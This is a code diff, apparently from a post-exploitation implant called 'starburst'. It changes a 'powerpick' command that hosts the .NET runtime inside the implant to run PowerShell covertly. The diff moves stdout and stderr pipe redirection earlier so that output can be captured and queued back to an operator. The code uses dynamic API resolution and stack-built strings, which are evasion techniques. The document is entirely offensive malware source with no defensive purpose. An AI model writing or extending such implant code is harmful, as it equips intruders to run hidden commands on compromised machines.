@@ -233,6 +233,22 @@ auto declfn starburst::cmd_powerpick(
         inst.kernel32.GetProcAddress(
             (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );
 
+    if ( !inst.powerpick.stdout_redirected ) {
+        SECURITY_ATTRIBUTES sa_pipe = {};
+        sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
+        sa_pipe.bInheritHandle = TRUE;
+
+        inst.kernel32.CreatePipe(
+            &inst.powerpick.pipe_read,
+            &inst.powerpick.pipe_write, &sa_pipe, 0 );
+
+        if ( pSetStdHandle ) {
+            pSetStdHandle( STD_OUTPUT_HANDLE, inst.powerpick.pipe_write );
+            pSetStdHandle( STD_ERROR_HANDLE, inst.powerpick.pipe_write );
+        }
+        inst.powerpick.stdout_redirected = true;
+    }
+
     // load mscoree.dll for CLR hosting
     STK_MSCOREE(_n2);
     auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
@@ -394,24 +410,6 @@ auto declfn starburst::cmd_powerpick(
         str_concat( err_buf, hex );
         queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
         return;
-    }
-
-    // Persistent pipe for stdout capture - .NET Console caches TextWriter on first
-    // access, so reusing the same pipe across calls avoids stale handle errors.
-    if ( !inst.powerpick.stdout_redirected ) {
-        SECURITY_ATTRIBUTES sa_pipe = {};
-        sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
-        sa_pipe.bInheritHandle = TRUE;
-
-        inst.kernel32.CreatePipe(
-            &inst.powerpick.pipe_read,
-            &inst.powerpick.pipe_write, &sa_pipe, 0 );
-
-        if ( pSetStdHandle ) {
-            pSetStdHandle( STD_OUTPUT_HANDLE, inst.powerpick.pipe_write );
-            pSetStdHandle( STD_ERROR_HANDLE, inst.powerpick.pipe_write );
-        }
-        inst.powerpick.stdout_redirected = true;
     }
 
     // Build args for Invoke_3: SAFEARRAY(VARIANT) containing SAFEARRAY(BSTR)
